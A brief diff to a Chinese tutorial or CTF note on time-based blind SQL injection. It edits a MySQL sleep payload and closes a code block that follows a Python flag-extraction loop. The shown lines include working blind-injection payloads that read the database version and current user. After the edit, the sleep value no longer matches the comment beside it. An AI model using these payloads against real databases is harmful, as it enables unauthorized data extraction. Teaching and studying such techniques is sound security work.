@@ -27,7 +27,7 @@
 ### 手工注入
 
 ```sql
-select sleep(if(length(@@version)=6,2,0));
+select sleep(if(length(@@version)=6,20,0));
 --长度为6 sleep 2秒，否则0秒。
 
 select sleep(if(ord(mid((select user()),1,1))<150,0,2));
@@ -70,6 +70,7 @@ for i in range(33):
     print "flag:",flag
     break
 print "result:"+flag
+```
 
 ### sqlmap  
 
